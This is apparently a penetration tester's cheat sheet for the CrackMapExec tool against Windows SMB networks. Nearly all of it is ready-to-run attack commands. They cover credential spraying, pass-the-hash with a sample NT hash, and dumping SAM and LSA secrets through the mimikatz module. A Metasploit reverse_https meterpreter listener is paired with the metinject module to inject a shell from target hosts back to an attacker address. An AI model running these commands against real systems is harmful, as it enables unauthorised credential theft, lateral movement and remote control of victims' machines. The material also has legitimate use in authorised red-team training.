# CrackMapExec
https://github.com/byt3bl33d3r/CrackMapExec

* Tutorial - https://byt3bl33d3r.github.io/getting-the-goods-with-crackmapexec-part-1.html
* Cheatsheet -
* https://github.com/byt3bl33d3r/CrackMapExec/wiki/Using-Modules

- if win10 then you need to install cme 4.0 to dump the hashes

**IMPORTANT**
When running this or other software like this that attempts to log in, make sure you don't lock out accounts, especially DA accounts.

* Map network
```
# crackmapexec smb 445.txt
```

* Test creds
```
# crackmapexec smb 445.txt -u User -p Password
```
  + Green plus indicates user can log in, but is not local admin
  + Pwn3d! indicates local admin

* Pass the hash
```
crackmapexec smb <target(s)> -u username -H LMHASH:NTHASH
crackmapexec smb <target(s)> -u username -H NTHASH

# crackmapexec smb 10.55.100.0/24 -u winlab -H 5120d0cb0df939e3044c5843e37b2c5f --local --lsa
```

* Escalating with Crackmap  
  Escalate with relayed sam hashes (local auth, shared admin passwords)
		`crackmapexec smb ips.txt -u username -H hash -M mimikatz --local-auth --server-port 5678`
	Escalate with cleartext domain credentials
		`crackmapexec smb ips.txt -u username -p Password -M mimikatz --server-port 5678`


## Shells

* We can use the metinject module to directly inject meterpreter into memory using PowerSploit's Invoke-Shellcode.ps1 script.

* Set up Listener
```
msf > use exploit/multi/handler
msf exploit(handler) > set payload windows/meterpreter/reverse_https
payload => windows/meterpreter/reverse_https
msf exploit(handler) > set LHOST 192.168.10.3
LHOST => 192.168.10.3
msf exploit(handler) > set exitonsession false
exitonsession => false
msf exploit(handler) > exploit -j
[*] Exploit running as background job.

[*] Started HTTPS reverse handler on https://192.168.10.3:8443
msf exploit(handler) > [*] Starting the payload handler...
```

* Start CrackMapExec
```
# crackmapexec 192.168.10.0/24 -u username -p password -M metinject -o LHOST=192.168.10.3 LPORT=8443
```
